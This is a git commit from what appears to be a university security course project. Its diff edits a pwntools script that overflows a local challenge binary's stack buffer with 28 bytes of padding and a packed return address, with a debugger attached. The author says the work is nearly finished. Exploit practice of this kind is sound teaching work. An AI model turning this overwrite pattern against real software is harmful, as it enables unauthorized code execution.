995f209c5065d4c412e80da0cdb0719473ea3b97
William Mironchuk <wmironchuk@umass.edu>
2022-02-28 17:02:28 -0500

    geting close to being able to jump to book
    This relase has added some values to the stack that have been
    overwritten, and aparently I overshot the mark, but I am so close to the
    begining

--- chall_1/chall_1.py
+++ chall_1/chall_1.py
@@ -5,9 +5,12 @@ pwn.context.clear(arch="amd64")
 
 p = pwn.process("/home/cubscout61/Current/CS390R/Projects/project2/chall_1/chall")
 
+pwn.gdb.attach(target=p)
+
 main_payload = bytearray()
 main_payload += b"a" * 28
-main_payload += b"b" * 4
-main_payload += 0x40127a
+main_payload += pwn.p64(0x40127a)
 
-p.send_line(main_payload)
+print(p.recvline())
+p.sendline(main_payload)
+p.interactive()
